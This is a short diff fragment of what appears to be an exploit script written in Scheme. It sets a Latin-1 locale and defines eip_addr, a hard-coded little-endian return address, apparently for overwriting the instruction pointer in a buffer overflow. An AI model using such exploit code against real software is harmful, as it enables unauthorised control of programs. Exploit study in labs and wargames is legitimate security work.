@@ -1,4 +1,4 @@
-
+(setlocale LC_ALL "en_US.iso88591")
 (define eip_addr "\x82\x84\x04\x08")
 
 (define code (lambda ()
